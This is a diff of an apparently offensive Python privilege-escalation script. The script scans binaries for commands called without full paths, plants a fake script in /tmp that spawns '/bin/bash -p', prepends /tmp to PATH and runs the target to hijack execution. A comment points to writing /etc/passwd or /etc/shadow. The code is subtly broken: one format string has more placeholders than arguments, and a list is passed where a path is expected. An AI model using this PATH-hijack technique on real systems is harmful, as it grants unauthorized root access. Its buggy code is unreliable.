@@ -422,27 +422,28 @@ def path():
    with open("/tmp/path.txt") as root_files:
       lines = root_files.readlines()
       for line in lines:
-         os.system("file {} > /tmp/file.txt".format())
+         os.system("file {} > /tmp/file.txt".format(line))
          with open("/tmp/file.txt") as file:
-            f = file.read()
-            if "executable" in f or "script" in f or "shell" in f:
-               split_path = line.split("/")
-               split_path_1 = split_path[-1].strip()
-               os.system("strings {} > /tmp/poss_path.txt".format(line.split()))
-               with open("/tmp/poss_path.txt") as strings_file:
-                  lines_strings = strings_file.readlines()
-                  for item in lines_strings:
-                     for cmd in common_cmds:
-                        non_path_cmd = re.search("\s{}\s".format(cmd), str(item))
-                        if non_path_cmd:
-                           print("### {} does not specify full path of {} ###".format(line,cmd))
-                           os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(line,cmd))
-                           os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
-                           break
-                        else:
-                           continue
-            else:
-               continue
+            f = file.readlines()
+            for thing in f:
+               if "script" in thing or "shell" in thing:
+                  split_path = line.split("/")
+                  split_path_1 = split_path[-1].strip()
+                  os.system("strings {} > /tmp/poss_path.txt".format(line.split()))
+                  with open("/tmp/poss_path.txt") as strings_file:
+                     lines_strings = strings_file.readlines()
+                     for item in lines_strings:
+                        for cmd in common_cmds:
+                           non_path_cmd = re.search("\s{}\s".format(cmd), str(item))
+                           if non_path_cmd:
+                              print("### {} does not specify full path of {} ###".format(line,cmd))
+                              os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(line,cmd))
+                              os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
+                              break
+                           else:
+                              continue
+               else:
+                  continue
 
 
 # try writing to /etc/passwd or /etc/shadow
